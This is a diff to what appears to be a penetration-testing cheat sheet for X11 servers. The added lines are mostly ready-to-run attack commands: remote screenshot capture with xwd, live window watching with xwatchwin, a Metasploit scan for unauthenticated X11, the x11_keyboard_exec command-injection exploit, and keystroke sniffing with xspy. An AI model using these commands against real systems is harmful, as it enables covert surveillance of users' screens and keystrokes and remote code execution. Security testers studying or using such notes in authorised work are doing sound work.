@@ -1,7 +1,38 @@
-# Xorg
+# Xorg (X11)
+# Default Port:6000
+
+# Remote Screenshot (xdpyinfo)
+;; We can also use x11 to grab screenshots or live videos of the user. We
+;; need to verify the connection is open and we can get to it:
+xdpyinfo -display <ip>:<display>
+
+# Remote Screenshot (xwd)
 xwd -root -screen -slient -display 192.168.1.108:0 > out.xwd
 convert out.xwd out.png
+;; or
+xwd -root -display <IP>:0 -out xdump.xdump
+display xdump.xdump
 
+# Live Capture
+;; First we need to find the ID of the window using xwininfo
+xwininfo -root -display <IP>:0
+./xwatchwin <IP>:0 -w 0x45
+
+
+# Enumeration (metasploit)
+;; Module scans for X11 servers that allow anyone to connect without authentication.
+use auxiliary/scanner/x11/open_x11
+run
+
+
+# Exploit - X11 Keyboard Command Injection (metasploit)
+;; Reference: http://rageweb.info/2014/05/04/open-x11-server/
+use exploit/unix/x11/x11_keyboard_exec
+run
+
+# Exploit - Sniff Keyboard keystrokes
+;; Install http://tools.kali.org/sniffingspoofing/xspy
+xspy <IP>
 
 
 # Xterm
